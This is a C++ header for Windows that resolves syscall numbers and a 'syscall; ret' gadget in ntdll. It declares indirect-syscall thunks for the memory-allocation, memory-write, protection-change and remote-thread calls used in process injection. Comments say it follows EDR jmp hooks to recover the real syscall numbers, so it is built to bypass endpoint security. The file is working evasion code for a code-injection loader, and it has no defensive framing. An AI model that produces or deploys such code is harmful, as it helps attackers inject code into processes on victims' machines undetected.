#pragma once
#include <Windows.h>
#include <cstdint>

#pragma comment(lib, "ntdll.lib")

// ── NT types not always exposed by winternl.h ────────────────────────────────
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

typedef LONG NTSTATUS;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes(p,n,a,r,s) \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r;                  \
    (p)->Attributes = a;                     \
    (p)->ObjectName = n;                     \
    (p)->SecurityDescriptor = s;             \
    (p)->SecurityQualityOfService = nullptr
#endif

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// ── Syscall resolution ────────────────────────────────────────────────────────
namespace Syscall {

    struct SyscallEntry {
        DWORD ssn;
        PVOID syscallGadget;
    };

    inline SyscallEntry NtAllocateVirtualMemory_entry{};
    inline SyscallEntry NtWriteVirtualMemory_entry{};
    inline SyscallEntry NtProtectVirtualMemory_entry{};
    inline SyscallEntry NtCreateThreadEx_entry{};
    inline SyscallEntry NtOpenProcess_entry{};
    inline SyscallEntry NtQueryVirtualMemory_entry{};
    inline SyscallEntry NtClose_entry{};

    // Find "syscall; ret" (0F 05 C3) gadget in ntdll .text
    inline PVOID FindSyscallGadget(HMODULE ntdll) {
        auto base = reinterpret_cast<PBYTE>(ntdll);
        auto dos  = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
        auto nt   = reinterpret_cast<PIMAGE_NT_HEADERS>(base + dos->e_lfanew);
        auto sec  = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
            if (memcmp(sec->Name, ".text", 5) != 0) continue;
            auto start = base + sec->VirtualAddress;
            auto end   = start + sec->Misc.VirtualSize - 1;
            for (auto p = start; p < end; ++p)
                if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3)
                    return p;
        }
        return nullptr;
    }

    // Extract SSN from stub — handles EDR jmp hooks by following the jmp
    inline DWORD ExtractSSN(PVOID funcAddr) {
        auto b = reinterpret_cast<PBYTE>(funcAddr);
        if (b[0] == 0xE9) // hooked: jmp rel32
            b = b + 5 + *reinterpret_cast<INT32*>(b + 1);
        // Standard stub: 4C 8B D1 B8 <ssn>  (mov r10,rcx; mov eax,ssn)
        if (b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8)
            return *reinterpret_cast<DWORD*>(b + 4);
        if (b[0] == 0xB8) // older stubs: B8 <ssn>
            return *reinterpret_cast<DWORD*>(b + 1);
        return 0xFFFFFFFF;
    }

    inline bool Resolve(HMODULE ntdll) {
        PVOID gadget = FindSyscallGadget(ntdll);
        if (!gadget) return false;

        struct { const char* name; SyscallEntry* entry; } funcs[] = {
            { "NtAllocateVirtualMemory", &NtAllocateVirtualMemory_entry },
            { "NtWriteVirtualMemory",    &NtWriteVirtualMemory_entry    },
            { "NtProtectVirtualMemory",  &NtProtectVirtualMemory_entry  },
            { "NtCreateThreadEx",        &NtCreateThreadEx_entry        },
            { "NtOpenProcess",           &NtOpenProcess_entry           },
            { "NtQueryVirtualMemory",    &NtQueryVirtualMemory_entry    },
            { "NtClose",                 &NtClose_entry                 },
        };

        for (auto& f : funcs) {
            FARPROC addr = GetProcAddress(ntdll, f.name);
            if (!addr) return false;
            f.entry->ssn           = ExtractSSN(reinterpret_cast<PVOID>(addr));
            f.entry->syscallGadget = gadget;
            if (f.entry->ssn == 0xFFFFFFFF) return false;
        }
        return true;
    }

} // namespace Syscall

// ── Indirect syscall extern declarations ─────────────────────────────────────
// Implemented in Syscalls.asm — each thunk loads SSN into rax,
// then jumps to the real "syscall; ret" gadget in ntdll.

extern "C" {
    NTSTATUS IndirectNtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NTSTATUS IndirectNtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS IndirectNtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
    NTSTATUS IndirectNtCreateThreadEx(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
                                      HANDLE, PVOID, PVOID, ULONG,
                                      SIZE_T, SIZE_T, SIZE_T, PVOID);
    NTSTATUS IndirectNtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
    NTSTATUS IndirectNtClose(HANDLE);
    NTSTATUS IndirectNtQueryVirtualMemory(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
}